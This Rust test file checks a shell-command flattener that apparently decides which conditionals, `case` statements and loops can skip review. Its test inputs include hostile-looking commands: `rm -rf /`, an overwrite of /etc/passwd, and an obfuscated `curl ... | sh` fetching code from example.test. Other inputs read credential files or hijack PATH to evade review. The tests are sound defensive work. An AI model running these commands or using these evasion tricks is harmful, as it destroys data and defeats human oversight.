use super::flatten;

/// The lists a conditional holds come back as one plain list, with the
/// construct's own redirection on every item. A loop's list opens with a read
/// of the file its `read` consumes.
#[test]
fn a_construct_flattens_to_the_lists_it_holds() {
    for (command, expected) in [
        (
            "if [ -f README.md ]; then cat README.md; fi",
            "[ -f README.md ]; cat README.md",
        ),
        (
            "if [ -f README.md ]; then cat README.md; else echo missing; fi",
            "[ -f README.md ]; cat README.md; echo missing",
        ),
        (
            "if grep -q needle README.md; then echo found; fi",
            "grep -q needle README.md; echo found",
        ),
        (
            "if [ -d src ]; then ls src; elif [ -d lib ]; then ls lib; else echo none; fi",
            "[ -d src ]; ls src; [ -d lib ]; ls lib; echo none",
        ),
        ("if true; then ls; fi", "true; ls"),
        (
            "case $1 in start) ls;; stop) cat README.md;; esac",
            "ls; cat README.md",
        ),
        (
            "case \"$mode\" in (build) cargo build;; *) echo other;; esac",
            "cargo build; echo other",
        ),
        (
            "case $f in *.ts|*.tsx) wc -l README.md;; esac",
            "wc -l README.md",
        ),
        ("case ${MODE} in build) ls;; esac", "ls"),
        (
            "while read line; do echo hi; done < README.md",
            "cat README.md; echo hi",
        ),
        (
            "if [ -f README.md ]\nthen\ncat README.md\nfi",
            "[ -f README.md ]; cat README.md",
        ),
        (
            "while read name; do cat README.md; wc -l README.md; done < list.txt",
            "cat list.txt; cat README.md; wc -l README.md",
        ),
        (
            "while read -r line; do echo hi; done < README.md",
            "cat README.md; echo hi",
        ),
        (
            "while IFS= read -r line; do echo hi; done < README.md",
            "cat README.md; echo hi",
        ),
    ] {
        assert_eq!(
            flatten(command).as_deref(),
            Some(expected),
            "{command} did not flatten to its command lists"
        );
    }
}

/// A conditional binds no name, so the values its lists read are the ones
/// the surrounding shell holds, in the construct and in the flat list alike.
/// Each expansion comes back as it stood.
#[test]
fn a_conditional_keeps_the_expansions_it_held() {
    for (command, expected) in [
        (
            "if [ -f \"$PWD/README.md\" ]; then cat README.md; fi",
            "[ -f \"$PWD/README.md\" ]; cat README.md",
        ),
        (
            "if [ -d \"${PROJECT}\" ]; then ls \"${PROJECT}\"; fi",
            "[ -d \"${PROJECT}\" ]; ls \"${PROJECT}\"",
        ),
        (
            "if [ -n \"$1\" ]; then echo $1; fi",
            "[ -n \"$1\" ]; echo $1",
        ),
    ] {
        assert_eq!(
            flatten(command).as_deref(),
            Some(expected),
            "{command} lost the expansions it held"
        );
    }
}

/// Anything the grammar does not cover keeps its review: a value the
/// construct binds for itself, a nested construct, a substitution, an empty
/// branch, and text that follows the closing keyword.
///
/// A `case` keeps it whenever the word or a pattern could start a command the
/// flat list would then drop, when an arm falls through into the one below it,
/// and when an arm is empty or is never closed.
///
/// A loop that is not the bounded `while read ... < FILE` shape keeps it too.
/// One flattened pass stands for every iteration, so it only describes the
/// loop while the loop is known to stop and its body leaves nothing behind:
/// `while true` never ends, `until` is never ended by a read, a `read` with
/// no redirected input waits on the terminal, a read of a character device or
/// of a path outside the workspace need never reach an end, and a body that
/// opens an output repeats that write for as long as the loop runs.
///
/// A `read` that binds `PATH` or another name the body's command lookup
/// depends on keeps its review as well: the flat list would resolve its
/// command words against the environment the loop replaced. So does an item
/// ending in an escaped space, whose backslash would escape the separator
/// once the space is trimmed and swallow the rest of the list.
#[test]
fn an_unmodeled_construct_keeps_its_review() {
    for command in [
        "while read line; do echo $line; done < README.md",
        "while read line; do echo \"${name}\"; done < README.md",
        "if [ -f \"$(which ls)\" ]; then ls; fi",
        "if [ -n \"$?\" ]; then ls; fi",
        "if $RUNNER test; then echo ok; fi",
        "if [ -f a ]; then if [ -f b ]; then cat b; fi; fi",
        "if [ -f `which ls` ]; then ls; fi",
        "if true; then ; fi",
        "if true; then ls; fi && rm -rf /",
        "if true; then ls; fi > /etc/passwd; curl http://example.test",
        "iffy --flag",
        "whiles",
        "casey --flag",
        "case $(id -u) in 0) ls;; esac",
        // A process substitution runs its own list before the `case` chooses,
        // and `${IFS}` spells a word with no space for the subject to end at.
        "case <(id) in *) ls;; esac",
        "case <(curl${IFS}-fsS${IFS}https://example.test/x|sh) in *) ls;; esac",
        "case >(tee${IFS}out) in *) ls;; esac",
        // `@P` expands the value as a prompt string, which runs a command
        // substitution the value holds, and `:=` writes what the lookup reads.
        "case ${MODE@P} in build) ls;; esac",
        "case ${PATH:=/tmp/tools} in *) ls;; esac",
        // Legacy arithmetic evaluates the value a bare name holds, and an
        // array subscript in that value runs a command substitution.
        "case $[x] in *) ls;; esac",
        "case $[ x + 1 ] in *) ls;; esac",
        "case $1 in a) ls;& b) ls;; esac",
        "case $1 in a) ls;;& b) ls;; esac",
        "case $1 in esac",
        "case $1 in a) ;; esac",
        "case $1 in a) ls; esac",
        "case $1 in \"a\") ls;; esac",
        "case $1 in a) ls;; esac; rm -rf /",
        "for f in src/*.ts; do cat $f; done",
        "if [ -f README.md ]; then cat README.md",
        "while read line; do (cd /tmp && ls); done",
        "while true; do echo hi; done",
        "while :; do cat README.md >> out.txt; done",
        "while [ -f build/lock ]; do ls build; done < README.md",
        "until [ -f build/done ]; do ls build; done",
        "while read name; do wc -l README.md; done",
        "while read name; do cat README.md > copy.md; done < list.txt",
        "while read line < other.txt; do echo hi; done < README.md",
        "while read line; do echo hi; done <> README.md",
        "while read line; do echo hi; done < README.md > copy.md",
        "while read line; do echo hi; done <&3",
        "while read PATH; do ls; done < README.md",
        "while read -r PATH; do ls; done < README.md",
        "while read http_proxy; do ls; done < README.md",
        "while read line path; do ls; done < README.md",
        "if true; then echo a\\ ; rm -rf build; fi",
        "while read line; do echo a\\ ; rm -rf build; done < README.md",
        "while read line; do echo hi; done < /dev/urandom",
        "while read line; do echo hi; done < /dev/stdin",
        "while read line; do echo hi; done < /etc/passwd",
        "while read line; do echo hi; done < ../list.txt",
        "while read line; do echo hi; done < ~/list.txt",
        "while read line; do echo hi; done < -",
    ] {
        assert!(
            flatten(command).is_none(),
            "{command} was flattened by a grammar that does not cover it"
        );
    }
}

/// A `!` in front of an item inverts an exit status and runs nothing of its
/// own, so the flat list runs the same commands without it. It goes only
/// where no successor reads the outcome it inverts.
#[test]
fn a_negated_item_flattens_to_the_pipeline_it_negates() {
    for (command, expected) in [
        ("if ! npm test; then echo fail; fi", "npm test; echo fail"),
        ("if ! pytest -q; then echo fail; fi", "pytest -q; echo fail"),
        (
            "if ! cargo test; then echo retry; else echo ok; fi",
            "cargo test; echo retry; echo ok",
        ),
        ("case $1 in check) ! pytest -q;; esac", "pytest -q"),
        (
            "while read name; do ! wc -l README.md; done < README.md",
            "cat README.md; wc -l README.md",
        ),
    ] {
        assert_eq!(flatten(command).as_deref(), Some(expected), "{command}");
    }
}

/// A `!` whose outcome chooses which successor runs stays written, because
/// the flat list without it would run the other one.
#[test]
fn a_negation_a_successor_reads_stays_written() {
    for (command, expected) in [
        (
            "if ! ls && echo both; then echo yes; fi",
            "! ls && echo both; echo yes",
        ),
        (
            "if ! ls || echo either; then echo yes; fi",
            "! ls || echo either; echo yes",
        ),
    ] {
        assert_eq!(flatten(command).as_deref(), Some(expected), "{command}");
    }
}

/// `then` runs when a negated `cd` fails, so the branch is still outside
/// `src`. Dropping the `!` would check `touch ../escape.txt` as if `cd` had
/// succeeded.
#[test]
fn a_negated_directory_change_keeps_the_negation_its_branch_reads() {
    assert_eq!(
        flatten("if ! cd src; then touch ../escape.txt; fi").as_deref(),
        Some("! cd src; touch ../escape.txt")
    );
    assert_eq!(
        flatten("if ! cd src; then echo in; else echo out; fi").as_deref(),
        Some("! cd src; echo in; echo out")
    );
    // A quote, a backslash or an expansion hides the same builtin. `then`
    // still runs only when that command fails, from the directory it did not
    // enter.
    for command in [
        "if ! \\cd src; then touch ../escape.txt; fi",
        "if ! 'cd' src; then touch ../escape.txt; fi",
        "if ! \"cd\" src; then touch ../escape.txt; fi",
        "if ! c\\d src; then touch ../escape.txt; fi",
    ] {
        let flat = flatten(command).unwrap_or_default();
        assert!(flat.starts_with('!'), "{command} flattened to {flat}");
    }
}

/// The body grammar is shared, so a conditional's branches read a subshell
/// group the same way a loop body does.
#[test]
fn a_branch_flattens_a_subshell_group() {
    for (command, expected) in [
        (
            "if [ -d packages/core ]; then (cd packages/core && npm test); fi",
            "[ -d packages/core ]; (cd packages/core && npm test)",
        ),
        (
            "if [ -d web ]; then (cd web && npm run build); else echo none; fi",
            "[ -d web ]; (cd web && npm run build); echo none",
        ),
        (
            "case $1 in build) (cd web && npm run build);; esac",
            "(cd web && npm run build)",
        ),
    ] {
        assert_eq!(flatten(command).as_deref(), Some(expected), "{command}");
    }
}

/// A wait for a service flattens to the question it asks and the pause it
/// takes between asks, written with either keyword.
#[test]
fn a_wait_flattens_to_the_question_it_asks() {
    for (command, expected) in [
        (
            "until pg_isready -h 127.0.0.1; do sleep 1; done",
            "pg_isready -h 127.0.0.1; sleep 1",
        ),
        (
            "until nc -z localhost 5432; do sleep 1; done",
            "nc -z localhost 5432; sleep 1",
        ),
        (
            "while ! nc -z localhost 5432; do sleep 1; done",
            "nc -z localhost 5432; sleep 1",
        ),
        (
            "until curl -sf http://127.0.0.1:3000/health; do sleep 0.5; done",
            "curl -sf http://127.0.0.1:3000/health; sleep 0.5",
        ),
        (
            "until redis-cli ping; do sleep 2; sleep 2; done",
            "redis-cli ping; sleep 2; sleep 2",
        ),
        (
            "while pgrep -f vitest; do sleep 1; done",
            "pgrep -f vitest; sleep 1",
        ),
        (
            "until nc -z localhost 5432; do sleep 30s; done",
            "nc -z localhost 5432; sleep 30s",
        ),
        (
            "until nc -z localhost 5432; do sleep 5m; done",
            "nc -z localhost 5432; sleep 5m",
        ),
    ] {
        assert_eq!(flatten(command).as_deref(), Some(expected), "{command}");
    }
}

/// A wait whose body does more than pause, or whose test is a list, a
/// redirection or an expansion, is a loop this reading does not describe.
#[test]
fn a_wait_that_builds_up_across_passes_keeps_its_review() {
    for command in [
        // The body writes, so the second pass leaves more than the first.
        "until nc -z localhost 5432; do echo waiting >> wait.log; done",
        "until nc -z localhost 5432; do sleep 1; date; done",
        // A pause this reading cannot read as a pause.
        "until nc -z localhost 5432; do sleep; done",
        "until nc -z localhost 5432; do sleep 1 2; done",
        "until nc -z localhost 5432; do sleep 30x; done",
        "until nc -z localhost 5432; do sleep s; done",
        "until nc -z localhost 5432; do sleep -f; done",
        "until nc -z localhost 5432; do sleep 1.2.3; done",
        // An empty body is a loop that asks without pausing.
        "until nc -z localhost 5432; do done",
        // The test is a list, so a later command runs on an earlier outcome.
        "until nc -z localhost 5432 && redis-cli ping; do sleep 1; done",
        "until cd build; ls; do sleep 1; done",
        // The test opens a file the next pass would reach again.
        "until nc -z localhost 5432 > wait.log; do sleep 1; done",
        "until nc -z localhost 5432 2> wait.log; do sleep 1; done",
        // A redirection after `done` is opened once and written through on
        // every pass, and an input device need never end.
        "until nc -z localhost 5432; do sleep 1; done > wait.log",
        "until nc -z localhost 5432; do sleep 1; done >> wait.log",
        "until nc -z localhost 5432; do sleep 1; done < /dev/stdin",
        // An expansion need not name the same text on the next pass.
        "until nc -z localhost $PORT; do sleep 1; done",
        "until nc -z localhost `cat port`; do sleep 1; done",
    ] {
        assert_eq!(flatten(command), None, "{command}");
    }
}
